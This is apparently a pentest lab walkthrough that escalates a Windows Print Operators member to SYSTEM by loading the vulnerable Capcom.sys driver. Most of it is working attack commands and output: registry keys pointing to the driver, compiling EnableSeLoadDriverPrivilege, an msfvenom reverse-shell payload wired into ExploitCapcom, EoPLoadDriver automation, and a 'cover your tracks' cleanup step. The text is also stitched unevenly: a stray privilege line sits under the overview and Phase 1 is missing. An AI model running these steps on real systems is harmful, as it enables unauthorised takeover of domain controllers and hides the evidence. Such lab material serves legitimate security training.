# Print Operators Privilege Escalation

## Overview

**Print Operators** is a highly privileged Active Directory security group that grants members significant system-level permissions.

### Key Privileges
- `SeLoadDriverPrivilege` - Primary escalation vector
- Rights to manage, create, share, and delete printers connected to Domain Controllers
- Ability to log on locally to Domain Controllers
- Ability to shut down Domain Controllers

**Resource:** [Microsoft - Print Operators Documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators)

SeIncreaseWorkingSetPrivilege        Increase a process working set     Disabled

**Critical:** `SeLoadDriverPrivilege` is now visible but **DISABLED** - needs to be enabled via exploitation tool.

## Phase 2: Exploit Method - Using Capcom.sys

### Vulnerability Overview
- **Driver:** `Capcom.sys`
- **Vulnerability:** Contains functionality allowing any user to execute shellcode with SYSTEM privileges
- **Exploitation:** Leverages `SeLoadDriverPrivilege` to load the vulnerable driver

**Resource:** [Capcom Rootkit Driver](https://github.com/FuzzySecurity/Capcom-Rootkit)

### Step 1: Obtain and Prepare Compilation Tool

#### Download EnableSeLoadDriverPrivilege.cpp

**Resource:** [EnableSeLoadDriverPrivilege.cpp](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)

#### Replace Include Headers

```cpp
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

### Step 2: Compile with Visual Studio 2019

**Requirements:** Visual Studio 2019 Developer Command Prompt with `cl.exe` compiler

#### Compilation Command

```cmd
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe EnableSeLoadDriverPrivilege.obj
```

**Output:** `EnableSeLoadDriverPrivilege.exe`

### Step 3: Download Capcom.sys Driver

**Resource:** [Capcom.sys Driver](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

**Storage Location:** `C:\temp\Capcom.sys` or `C:\Tools\Capcom.sys`

### Step 4: Add Registry Reference for Driver

Use NT Object Path syntax (`\??\`) to register the driver in HKEY_CURRENT_USER tree.

#### Command 1: Add ImagePath Registry Entry

```cmd
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.
```

#### Command 2: Add Type Registry Entry

```cmd
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```

#### NT Object Path Explanation
- Syntax: `\??\C:\path\to\driver.sys`
- Used to reference malicious driver's ImagePath
- Win32 API parses and resolves this path to properly locate and load the driver
- **Resource:** [MS-EVEN: NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c)

### Step 5: Verify Driver is NOT Loaded

Use Nirsoft's DriverView utility to confirm Capcom.sys is not loaded.

**Resource:** [DriverView.exe - Nirsoft](http://www.nirsoft.net/utils/driverview.html)

#### Commands

```powershell
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

**Expected Output:** No results (driver not yet loaded)

### Step 6: Enable SeLoadDriverPrivilege

Run the compiled `EnableSeLoadDriverPrivilege.exe` binary to enable the privilege and load the driver.

#### Execution

```cmd
C:\htb> EnableSeLoadDriverPrivilege.exe

whoami: INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled

NTSTATUS: 00000000, WinError: 0
```

**Success Indicators:**
- `SeLoadDriverPrivilege` now shows as **Enabled**
- NTSTATUS: 00000000 (success code)
- WinError: 0 (no errors)

### Step 7: Verify Capcom Driver is Loaded

#### Commands

```powershell
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

**Success:** Driver is now loaded and visible in system drivers.

## Phase 3: Alternate Exploitation - No GUI Access

### Scenario
When you don't have GUI access to the target system, you need to modify the exploit to execute a reverse shell instead of cmd.exe.

### Modification Steps

#### Locate LaunchShell() Function

Original code in `ExploitCapcom.cpp` (Line ~292):

```cpp
// Launches a command shell process
static bool LaunchShell() {
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

#### Generate Reverse Shell Payload

Use msfvenom to generate a reverse shell binary:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o c:\ProgramData\revshell.exe
```

#### Modify CommandLine String

```cpp
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

#### Compile and Execute

1. Recompile `ExploitCapcom.exe` with the modified code
2. Set up listener based on msfvenom payload
3. Execute `ExploitCapcom.exe`
4. Receive reverse shell connection with SYSTEM privileges

### Alternative Payloads

If reverse shell is blocked, consider:
- **Bind Shell** - Binds to a port instead of connecting back
- **Exec Payload** - Executes specific commands
- **Add User Payload** - Creates new privileged user account

## Phase 4: Automation - EoPLoadDriver

### Tool Overview
**EoPLoadDriver** automates the entire process:
- Enables `SeLoadDriverPrivilege`
- Creates registry key
- Executes `NTLoadDriver` to load driver

**Resource:** [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)

### Single Command Automation

```cmd
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

### Workflow After EoPLoadDriver
1. Run `EoPLoadDriver.exe` (automates privilege enable + driver load)
2. Run `ExploitCapcom.exe` to pop SYSTEM shell
3. Or execute custom binary with SYSTEM privileges

## Phase 5: Cleanup & Anti-Forensics

### Remove Registry Key

Cover your tracks by deleting the registry key added during exploitation:

```cmd
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```

### Important Note: Windows 10 v1803+

**⚠️ CRITICAL:** Since Windows 10 Version 1803, `SeLoadDriverPrivilege` is no longer exploitable.

**Reason:** It is no longer possible to include references to registry keys under `HKEY_CURRENT_USER`.

**Impact:** This exploitation method fails on Windows 10 v1803 and later versions.
